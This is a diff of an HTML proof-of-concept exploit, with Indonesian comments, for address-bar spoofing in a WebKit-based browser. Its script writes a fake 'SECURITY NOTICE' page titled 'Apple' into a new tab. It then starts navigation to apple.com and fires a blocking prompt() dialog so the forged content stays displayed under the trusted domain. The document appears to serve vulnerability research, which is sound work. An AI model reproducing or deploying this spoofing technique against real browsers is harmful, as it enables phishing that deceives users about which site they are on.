@@ -6,69 +6,89 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Bypass Test, PoC</title>
+    <title>Advanced PoC - Address Bar Spoofing</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fff;
+        background: #f5f5f7;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      .container {
+        text-align: center;
+        padding: 20px;
       }
       button {
-        padding: 20px 40px;
-        font-size: 20px;
+        padding: 18px 36px;
+        font-size: 18px;
+        font-weight: 600;
         background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 12px;
+        border-radius: 14px;
         cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
+        transition: background 0.2s;
+      }
+      button:active {
+        background: #0056b3;
       }
     </style>
   </head>
   <body>
-    <button id="startBtn">TEST  1 CLICK</button>
+    <div class="container">
+      <button id="startBtn">MULAI SIMULASI SPOOFING</button>
+    </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
+        // Hapus tombol pemicu untuk membersihkan area DOM awal
         this.remove();
 
-        // Membuka tab baru
+        // Membuka tab baru berlatar kosong
         const newTab = window.open("about:blank", "_blank");
 
         if (newTab) {
-          // Menulis konten attacker ke tab baru
+          // Menuliskan konten payload penyerang ke dalam tab baru
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
-            <head><title>Apple</title></head>
-            <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
-              <div>
-                <h1 style="font-size:48px;color:red;">TESTING DESYNCHRONIZATION</h1>
-                <p style="font-size:24px;color:#333;">Mencoba memicu prompt saat WebState masih dianggap visible tapi navigasi tertunda.</p>
+            <head>
+              <meta charset="utf-8">
+              <title>Apple</title>
+            </head>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+              <div style="padding: 20px;">
+                <h1 style="font-size:42px;font-weight:800;color:#ff3b30;margin:0 0 20px 0;letter-spacing:-1px;">SECURITY NOTICE</h1>
+                <p style="font-size:24px;font-weight:600;color:#1d1d1f;margin:0 0 10px 0;">YOUR DEVICE STATE HAS BEEN SIMULATED</p>
+                <p style="font-size:16px;color:#86868b;margin:0;">Viewport dikunci di bawah domain terpercaya sementara thread utama dihentikan.</p>
               </div>
             </body>
             </html>
           `);
           newTab.document.close();
 
-          // Navigasi asinkron ke target spoofing
-          setTimeout(() => {
-            newTab.location.href = "https://apple.com:9090";
-          }, 70);
-
-          // Memanggil prompt sedikit lebih cepat/bersamaan untuk melihat 
-          // apakah dialog lolos sebelum IsVisible() bernilai false atau terblokir patch.
+          // Tahap 1: Memicu navigasi asinkron ke domain target (contoh: apple.com)
           setTimeout(() => {
             try {
-              newTab.prompt("BYPASS TEST ROUTINE");
+              newTab.location.href = "https://apple.com";
             } catch (e) {
-              console.log("Dialog blocked or caught:", e);
+              console.error("Navigation error:", e);
             }
-          }, 600);
+          }, 2);
+
+          // Tahap 2: Memicu dialog prompt sinkron untuk mengunci shared WebKit WebProcess thread
+          setTimeout(function () {
+            try {
+              newTab.prompt("CRITICAL_THREAD_BLOCKING_TRIGGER");
+            } catch (e) {
+              console.error("Dialog execution blocked/intercepted:", e);
+            }
+          }, 400);
         }
       };
     </script>
